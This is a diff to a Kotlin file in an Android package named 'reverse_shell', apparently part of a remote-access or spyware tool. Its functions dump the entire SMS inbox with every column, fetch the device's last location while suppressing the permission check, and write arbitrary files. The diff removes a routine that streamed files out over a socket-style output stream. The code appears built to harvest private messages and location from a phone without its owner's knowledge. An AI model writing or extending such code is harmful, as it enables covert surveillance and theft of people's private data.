@@ -2,6 +2,7 @@ package com.satwik.nexgenius.core.reverse_shell
 
 import android.annotation.SuppressLint
 import android.content.Context
+import android.location.Location
 import android.net.Uri
 import com.google.android.gms.location.LocationServices
 import kotlinx.coroutines.Dispatchers
@@ -11,6 +12,7 @@ import kotlinx.coroutines.withContext
 import java.io.File
 import java.io.FileInputStream
 import java.io.OutputStream
+import java.net.Socket
 
 fun getSystemInfo(): String {
     val os = System.getProperty("os.name")
@@ -71,56 +73,39 @@ fun help():String{
 fun getSms(context: Context): String {
     val messages = mutableListOf<String>()
     val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
-    try {
-        cursor?.let {
-            if (it.moveToFirst()) {
-                do {
-                    var msgData = ""
-                    for (idx in 0 until it.columnCount) {
-                        msgData += " ${it.getColumnName(idx)}:${it.getString(idx)}"
-                    }
-                    messages.add(msgData)
-                } while (it.moveToNext())
-            } else {
-                return "Inbox is empty"
-            }
-            it.close()
+    cursor?.use {
+        if (it.moveToFirst()) {
+            do {
+                var msgData = ""
+                for (idx in 0 until it.columnCount) {
+                    msgData += " ${it.getColumnName(idx)}:${it.getString(idx)}"
+                }
+                messages.add(msgData)
+            } while (it.moveToNext())
+        } else {
+            throw Exception("Inbox is empty")
         }
     }
-    catch (e:Exception){
-        println(e)
-    }
-    return messages.toString()
+    val formattedMessages = messages.joinToString("\n")
+    return formattedMessages
 }
 
-fun sendFile(path: String, dataOutputStream: OutputStream): String {
-    println("send start")
-    val file = File(path)
-    FileInputStream(file).use { fileInputStream ->
-        dataOutputStream.write(file.length().toString().toByteArray())
 
-        val buffer = ByteArray(4 * 1024)
-        var bytesRead: Int
-
-        while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
-            dataOutputStream.write(buffer, 0, bytesRead)
-            dataOutputStream.flush()
-        }
-        println("send end")
-    }
-    return "File Sent"
+//Throws error: /sdcard/Dummy/pogo.txt: open failed: EPERM (Operation not permitted)
+fun writeToFile(path:String, fileName: String, data: String): String {
+    val file = File(path, fileName)
+    file.writeText(data)
+    return "Done"
 }
+
+
 
 @SuppressLint("MissingPermission")
-suspend fun getCurrentLocation(context: Context): Location {
+suspend fun getCurrentLocation(context: Context): Location? {
     val fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
-
     val lastLocation = fusedLocationClient.lastLocation.await()
-
     lastLocation.let {
-        val latitude = it.latitude
-        val longitude = it.longitude
-        return Location(latitude, longitude)
+        return lastLocation
     }
 }
 
